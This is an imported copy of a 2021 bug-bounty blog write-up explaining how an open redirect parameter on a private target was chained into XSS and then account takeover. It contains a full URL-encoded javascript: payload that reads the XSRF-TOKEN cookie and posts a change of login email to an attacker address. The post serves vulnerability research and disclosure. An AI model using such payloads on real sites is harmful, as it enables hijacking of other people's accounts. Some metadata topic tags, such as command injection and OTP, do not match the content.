---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-07-29_chaining-open-redirect-with-xss-to-account-takeover.md
original_filename: 2021-07-29_chaining-open-redirect-with-xss-to-account-takeover.md
title: Chaining Open Redirect with XSS to Account Takeover
category: documents
detected_topics:
- csrf
- xss
- command-injection
- otp
tags:
- imported
- documents
- csrf
- xss
- command-injection
- otp
language: en
raw_sha256: 17c70003e81fdf8aa3127c524859cb07e7391a55b30c0b5a0f22baeefa85c068
text_sha256: cf3770b872786104927dd2d6dfe44c9de958a98d8a95a779238fccf5c06bfbb5
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# Chaining Open Redirect with XSS to Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-07-29_chaining-open-redirect-with-xss-to-account-takeover.md
- Source Type: markdown
- Detected Topics: csrf, xss, command-injection, otp
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `17c70003e81fdf8aa3127c524859cb07e7391a55b30c0b5a0f22baeefa85c068`
- Text SHA256: `cf3770b872786104927dd2d6dfe44c9de958a98d8a95a779238fccf5c06bfbb5`


## Content

---
title: "Chaining Open Redirect with XSS to Account Takeover"
url: "https://radianid.medium.com/chaining-open-redirect-with-xss-to-account-takeover-36acf218a6d5"
authors: ["Radian ID"]
bugs: ["Open redirect", "XSS", "Account takeover"]
publication_date: "2021-07-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3468
scraped_via: "browseros"
---

# Chaining Open Redirect with XSS to Account Takeover

Radian ID
 highlighted

Chaining Open Redirect with XSS to Account Takeover
Radian ID
Follow
3 min read
·
Jul 29, 2021

187

1

Hello everyone, I hope you are well. In this article I will show you how I escalated XSS to Account Takeover. Since the target is private, let’s call as target.com.

The Open Redirect

I started testing target and register the account, while register, I can create my own subdomain for the organization like ownsubdomain.target.com. Then I logged in to the dashboard. Not long after, I found the url endpoint like this https://ownsubdomain.target.com/overview/?ccpa_redirect=

URL Endpoint

Then i tried to open redirect like this https://ownsubdomain.target.com/overview/?ccpa_redirect=https://evil.com and it was successfully, i was redirected to evil.com page :D. Then I tried to use this XSS payload javascript:alert(1); and opened in the browser, and yeah the XSS popped up.

Chaining the XSS to Account Takeover

After that, I didn’t immediately report the bug. I’m thinking of upgrading this XSS to a more severe impact. Shortly, I found a form that can change my email, like this

Press enter or click to view image in full size
Form Change Email

But there was an CSRF-TOKEN protection. Then I remember that I had read a writeup about Chaining the XSS to severe impact. So, I make the payload for change my email and bypassed the CSRF-TOKEN protection with XSS vulnerability. The payload was like this :

javascript:var%20http=new%20XMLHttpRequest();%20http.open(%27POST%27,%27https://ownsubdomain.target.com/api/3/settings/account%27,%20true);var%20csrf=%20document.cookie.split(%27;%20%27).find(row%20=%253e%20row.startsWith(%27XSRF-TOKEN%27)).split(%27=%27)[1];http.setRequestHeader(%27X-Xsrf-Token%27,csrf);http.withCredentials=true;http.setRequestHeader(%27Content-type%27,%27application/x-www-form-urlencoded%27);http.send(%27firstName=Hacked%2526lastName=byHacker%2526loginEmail=attacker@mail.com%26phoneNumber=%2526notificationEmail=attacker@mail.com%2526signature=%2526timezone=Asia/Jakarta%2526language=english%27);alert('email%20changed');

So, when I visited this URL https://ownsubdomain.target.com/overview/?ccpa_redirect=javascript:var%20http=new%20XMLHttpRequest();%20http.open(%27POST%27,%27https://subdomain.target.com/api/3/settings/account%27,%20true);var%20csrf=%20document.cookie.split(%27;%20%27).find(row%20=%253e%20row.startsWith(%27XSRF-TOKEN%27)).split(%27=%27)[1];http.setRequestHeader(%27X-Xsrf-Token%27,csrf);http.withCredentials=true;http.setRequestHeader(%27Content-type%27,%27application/x-www-form-urlencoded%27);http.send(%27firstName=Hacked%2526lastName=byHacker%2526loginEmail=attacker@mail.com%26phoneNumber=%2526notificationEmail=attacker@mail.com%2526signature=%2526timezone=Asia/Jakarta%2526language=english%27);alert('email%20changed'); in browser, the alert will popped up and the email will changed.

Alert Popped Up
Press enter or click to view image in full size
Email Changed Successfully

Then I reported this to the program, but I got duplicate :(

Get Radian ID’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I hope you are enjoyed my writeup, keep learning and stay safe.

Tips :

Don’t be quick to report any bugs you find, always look for more severe impacts.

Reference :

https://melotover.medium.com/how-i-leveraged-xss-to-make-privilege-escalation-to-be-super-admin-e120b6090451
